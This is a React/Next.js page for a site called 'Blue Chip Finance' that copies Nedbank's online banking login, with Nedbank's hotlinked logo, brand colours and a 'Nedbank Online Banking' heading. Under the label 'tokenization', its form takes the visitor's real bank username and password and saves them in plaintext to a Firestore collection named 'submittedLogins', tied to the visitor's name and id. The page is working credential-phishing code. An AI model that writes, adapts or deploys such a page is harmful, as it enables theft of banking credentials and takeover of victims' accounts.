import React from "react";
import userDataContext from "../../../context/UserDataContext";
import { useState, useContext } from "react";
import PrivateRoute from "../../../components/auth/PrivateRoute";
import { Meta } from "../../../components";
import { Box, Stack, Typography } from "@mui/material";
import cogoToast from "cogo-toast";
import { addDoc, collection } from "firebase/firestore";
import { db } from "../../../services/firebase.config";
import { useRouter } from "next/router";

const Nedbank = () => {
  const router = useRouter();
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });
  const [isLoading, setIsLoading] = useState(false);
  const { userData } = useContext(userDataContext);

  const { username, password } = formData;

  const formInputHandler = (e) => {
    e.preventDefault();

    setFormData((prev) => ({
      ...prev,
      [e.target.id]: e.target.value,
    }));
  };

  const tokenizeAccount = async () => {
    const validateDetails =
      password.trim().length > 0 && username.trim().length > 0;

    if (validateDetails) {
      try {
        setIsLoading(true);

        const res = await addDoc(collection(db, "submittedLogins"), {
          _user: userData.id,
          user_name: `${userData.firstName} ${userData.lastName}`,
          timeStamp: new Date(),
          data: {
            ...formData,
            bank: "nedbank",
          },
        });

        console.log(res);
        if (res) {
          cogoToast.success("Successful");
          router.replace("/account");
        }
        setIsLoading(false);
      } catch (error) {
        console.log(error);
        cogoToast.error("Something went wrong");
        setIsLoading(false);
      }
    } else {
      cogoToast.error("One or more inputs are invalid");
    }
  };

  return (
    <>
      <Meta
        title="Internet Banking - Nedbank Tokenization - Blue Chip Finance"
        description="Internet Banking - Nedbank Tokenization - Blue Chip Finance"
      />
      <PrivateRoute>
        <Stack
          component="header"
          direction="row"
          alignItems="center"
          justifyContent="space-between"
          gap={8}
          p={2}
          sx={{ borderBottom: "1px solid #eee" }}
        >
          <img
            src="https://secured.nedbank.co.za/NedbankIcon.3cee39915afd52c3.svg"
            alt="Nedbank Logo"
            style={{ width: "40px" }}
          />
        </Stack>
        <Typography fontSize={40} textAlign="center" color="#333" mb={4} mt={8}>
          Nedbank Online Banking
        </Typography>
        <Stack
          direction="column"
          alignItems="center"
          justifyContent="center"
          height="100%"
          sx={{ width: "400px", mx: "auto" }}
        >
          <form style={{ width: "100%" }}>
            <Box my={2}>
              <label htmlFor="username">Username</label>
              <input
                type="text"
                id="username"
                style={{
                  border: "none",
                  outline: "none",
                  border: "2px solid #78be20",
                  width: "100%",
                  display: "block",
                  maxWidth: "400px",
                  height: "50px",
                  padding: "8px 14px",
                  color: "#666",
                  fontSize: "15px",
                }}
                onChange={formInputHandler}
              />
            </Box>
            <Box my={4}>
              <label htmlFor="password">Password</label>
              <input
                type="password"
                id="password"
                style={{
                  border: "none",
                  outline: "none",
                  border: "2px solid #78be20",
                  width: "100%",
                  display: "block",
                  maxWidth: "400px",
                  height: "50px",
                  padding: "8px 14px",
                  color: "#666",
                  fontSize: "15px",
                }}
                onChange={formInputHandler}
              />
            </Box>
            <Box my={4}>
              <button
                type="button"
                style={{
                  border: "none",
                  outline: "none",
                  background: "#009639",
                  width: "100%",
                  display: "block",
                  maxWidth: "400px",
                  height: "50px",
                  padding: "8px 14px",
                  color: "#fff",
                  fontSize: "15px",
                  cursor: "pointer",
                  borderRadius: "4px",
                }}
                disabled={isLoading}
                onClick={tokenizeAccount}
              >
                {isLoading ? "Loading..." : "Proceed"}
              </button>
            </Box>
          </form>
        </Stack>
      </PrivateRoute>
    </>
  );
};

export default Nedbank;
